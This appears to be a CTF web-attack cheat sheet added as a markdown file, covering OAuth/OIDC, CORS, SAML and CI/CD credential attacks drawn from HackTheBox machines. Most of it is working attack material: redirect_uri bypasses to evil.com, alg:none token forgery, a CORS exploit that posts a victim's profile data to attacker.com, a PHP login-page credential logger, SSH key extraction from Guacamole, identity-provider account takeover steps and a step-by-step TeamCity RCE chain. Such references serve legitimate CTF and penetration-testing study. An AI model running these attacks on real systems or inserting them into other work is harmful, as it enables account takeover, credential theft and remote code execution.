@@ -1,0 +1,239 @@
+# CTF Web - OAuth, SAML & Infrastructure Auth Attacks
+
+## Table of Contents
+- [OAuth/OIDC Exploitation](#oauthoidc-exploitation)
+  - [Open Redirect Token Theft](#open-redirect-token-theft)
+  - [OIDC ID Token Manipulation](#oidc-id-token-manipulation)
+  - [OAuth State Parameter CSRF](#oauth-state-parameter-csrf)
+- [CORS Misconfiguration](#cors-misconfiguration)
+- [Git History Credential Leakage (Barrier HTB)](#git-history-credential-leakage-barrier-htb)
+- [CI/CD Variable Credential Theft (Barrier HTB)](#cicd-variable-credential-theft-barrier-htb)
+- [Identity Provider API Takeover (Barrier HTB)](#identity-provider-api-takeover-barrier-htb)
+- [SAML SSO Flow Automation (Barrier HTB)](#saml-sso-flow-automation-barrier-htb)
+- [Apache Guacamole Connection Parameter Extraction (Barrier HTB)](#apache-guacamole-connection-parameter-extraction-barrier-htb)
+- [Login Page Poisoning for Credential Harvesting (Watcher HTB)](#login-page-poisoning-for-credential-harvesting-watcher-htb)
+- [TeamCity REST API RCE (Watcher HTB)](#teamcity-rest-api-rce-watcher-htb)
+
+For JWT/JWE token attacks, see [auth-jwt.md](auth-jwt.md). For general auth bypass and access control, see [auth-and-access.md](auth-and-access.md).
+
+---
+
+## OAuth/OIDC Exploitation
+
+### Open Redirect Token Theft
+```python
+# OAuth authorization with redirect_uri manipulation
+# If redirect_uri validation is weak, steal tokens via open redirect
+import requests
+
+# Step 1: Craft malicious authorization URL
+auth_url = "https://target.com/oauth/authorize"
+params = {
+    "client_id": "legitimate_client",
+    "redirect_uri": "https://target.com/callback/../@attacker.com",  # path traversal
+    "response_type": "code",
+    "scope": "openid profile"
+}
+# Victim clicks → auth code sent to attacker's server
+
+# Common redirect_uri bypasses:
+# https://target.com/callback?next=https://evil.com
+# https://target.com/callback/../@evil.com
+# https://target.com/callback%23@evil.com  (fragment)
+# https://target.com/callback/.evil.com
+# https://target.com.evil.com  (subdomain)
+```
+
+### OIDC ID Token Manipulation
+```python
+# If server accepts unsigned tokens (alg: none)
+import jwt, json, base64
+
+token = "eyJ..."  # captured ID token
+header, payload, sig = token.split(".")
+# Decode and modify
+payload_data = json.loads(base64.urlsafe_b64decode(payload + "=="))
+payload_data["sub"] = "admin"
+payload_data["email"] = "admin@target.com"
+
+# Re-encode with alg:none
+new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
+new_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).rstrip(b"=")
+forged = f"{new_header.decode()}.{new_payload.decode()}."
+```
+
+### OAuth State Parameter CSRF
+```python
+# Missing or predictable state parameter allows CSRF
+# Attacker initiates OAuth flow, captures callback URL with auth code
+# Sends callback URL to victim → victim's session linked to attacker's OAuth account
+
+# Detection: Check if state parameter is:
+# 1. Present in authorization request
+# 2. Validated on callback
+# 3. Bound to user session (not just random)
+```
+
+**Key insight:** OAuth/OIDC attacks typically target redirect_uri validation (open redirect → token theft), token manipulation (alg:none, JWKS injection), or state parameter CSRF. Always test redirect_uri with path traversal, fragment injection, and subdomain tricks.
+
+---
+
+## CORS Misconfiguration
+
+```python
+# Test for reflected Origin
+import requests
+
+targets = [
+    "https://evil.com",
+    "https://target.com.evil.com",
+    "null",
+    "https://target.com%60.evil.com",
+]
+
+for origin in targets:
+    r = requests.get("https://target.com/api/sensitive",
+                     headers={"Origin": origin})
+    acao = r.headers.get("Access-Control-Allow-Origin", "")
+    acac = r.headers.get("Access-Control-Allow-Credentials", "")
+    if origin in acao or acao == "*":
+        print(f"[!] Reflected: {origin} -> ACAO: {acao}, ACAC: {acac}")
+```
+
+```javascript
+// Exploit: steal data via CORS misconfiguration
+// Host on attacker server, victim visits this page
+fetch('https://target.com/api/user/profile', {
+    credentials: 'include'
+}).then(r => r.json()).then(data => {
+    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
+});
+```
+
+**Key insight:** CORS is exploitable when `Access-Control-Allow-Origin` reflects the `Origin` header AND `Access-Control-Allow-Credentials: true`. Check for subdomain matching (`*.target.com` accepts `evil-target.com`), null origin acceptance (`sandbox` iframe), and prefix/suffix matching bugs.
+
+---
+
+## Git History Credential Leakage (Barrier HTB)
+
+Secrets removed in later commits remain in git history. Search the full diff history for deleted credentials:
+```bash
+git log --all --oneline
+git show <first_commit>
+# Search all history for a keyword across all branches:
+git log -p --all -S "password"
+```
+
+**Key insight:** `git log -p --all -S "keyword"` searches every commit diff for any string, including deleted secrets. Always check first commits and removed files.
+
+---
+
+## CI/CD Variable Credential Theft (Barrier HTB)
+
+CI/CD (Continuous Integration/Continuous Deployment) variable settings store secrets (API tokens, passwords) readable by project admins. These are often admin-level tokens for connected services (authentik, Vault, AWS).
+```bash
+# GitLab: Settings -> CI/CD -> Variables (visible to project admins)
+# GitHub: Settings -> Secrets and variables -> Actions
+# Jenkins: Manage Jenkins -> Credentials
+```
+
+**Key insight:** CI/CD variables frequently contain service account tokens with elevated privileges. A GitLab project admin can read all CI/CD variables, which may include tokens for identity providers, secret stores, or cloud platforms.
+
+---
+
+## Identity Provider API Takeover (Barrier HTB)
+
+Exploits an admin API token for identity providers (authentik, Keycloak, Okta) to take over any user account.
+
+**Attack chain:**
+1. Enumerate users: `GET /api/v3/core/users/`
+2. Set target user's password: `POST /api/v3/core/users/{pk}/set_password/`
+3. Check authentication flow stages — if MFA (Multi-Factor Authentication) has `not_configured_action: skip`, it auto-skips when no MFA devices are configured
+4. Authenticate through flow step-by-step (GET to start stage, POST to submit, follow 302s)
+
+**Key insight:** Identity provider admin tokens are the keys to the kingdom. If MFA stages have `not_configured_action: skip`, setting a user's password is sufficient for full account takeover — no MFA bypass needed.
+
+---
+
+## SAML SSO Flow Automation (Barrier HTB)
+
+Automates SAML (Security Assertion Markup Language) SSO login for services like Guacamole or internal apps when you control IdP (Identity Provider) credentials.
+
+**Steps:**
+1. Start login flow at the service — capture `SAMLRequest` + `RelayState` from the redirect
+2. Authenticate with IdP (via API or session)
+3. Submit IdP's signed `SAMLResponse` + original `RelayState` to service callback
+4. Extract auth token from state parameter redirect
+
+**Key insight:** Preserve `RelayState` through the entire flow — it correlates the callback with the login request. Mismatched `RelayState` causes authentication failure even with a valid `SAMLResponse`.
+
+---
+
+## Apache Guacamole Connection Parameter Extraction (Barrier HTB)
+
+Apache Guacamole stores SSH keys, passwords, and connection details in MySQL. Extract them with DB access or an authenticated API token:
+```bash
+# Via API with auth token
+curl "http://TARGET:8080/guacamole/api/session/data/mysql/connections/1/parameters?token=$TOKEN"
+# Returns: hostname, port, username, private-key, passphrase
+```
+
+```sql
+-- Via MySQL directly
+SELECT c.connection_name, cp.parameter_name, cp.parameter_value
+FROM guacamole_connection c
+JOIN guacamole_connection_parameter cp ON c.connection_id = cp.connection_id;
+```
+
+**Key insight:** Guacamole connection parameters contain plaintext SSH private keys and passphrases. A single API token or database access exposes credentials for every managed host.
+
+---
+
+## Login Page Poisoning for Credential Harvesting (Watcher HTB)
+
+Injects a credential logger into the web app login page to capture plaintext passwords:
+```php
+// Add after successful login check in index.php:
+$f = fopen('/dev/shm/creds.txt', 'a+');
+fputs($f, "{$_POST['name']}:{$_POST['password']}\n");
+fclose($f);
+```
+
+Wait for automated logins (bots, cron scripts). Check audit logs for frequently-logging-in users — they likely have hardcoded credentials you can harvest.
+
+**Key insight:** `/dev/shm/` is a tmpfs mount writable by any user and invisible to most monitoring. Automated services (backup scripts, health checks) often authenticate with elevated credentials on predictable schedules.
+
+---
+
+## TeamCity REST API RCE (Watcher HTB)
+
+Exploits TeamCity admin credentials to achieve RCE (Remote Code Execution) through build step injection:
+```bash
+# 1. Create project
+curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects' \
+  -u 'USER:PASS' -H 'Content-Type: application/xml' \
+  -d '<newProjectDescription name="pwn" id="pwn"><parentProject locator="id:_Root"/></newProjectDescription>'
+
+# 2. Create build config
+curl -X POST 'http://HOST:8111/httpAuth/app/rest/projects/pwn/buildTypes' \
+  -u 'USER:PASS' -H 'Content-Type: application/xml' \
+  -d '<newBuildTypeDescription name="rce" id="rce"><project id="pwn"/></newBuildTypeDescription>'
+
+# 3. Add command-line build step
+curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildTypes/id:rce/steps' \
+  -u 'USER:PASS' -H 'Content-Type: application/xml' \
+  -d '<step name="cmd" type="simpleRunner"><properties>
+    <property name="script.content" value="cat /root/root.txt"/>
+    <property name="use.custom.script" value="true"/>
+  </properties></step>'
+
+# 4. Trigger build
+curl -X POST 'http://HOST:8111/httpAuth/app/rest/buildQueue' \
+  -u 'USER:PASS' -H 'Content-Type: application/xml' \
+  -d '<build><buildType id="rce"/></build>'
+
+# 5. Read build log for output
+curl 'http://HOST:8111/httpAuth/downloadBuildLog.html?buildId=ID' -u 'USER:PASS'
+```
+
+**Key insight:** If build agent runs as root, all build steps execute as root. Check `ps aux` for build agent process ownership. TeamCity REST API provides full project/build management — admin credentials = RCE.
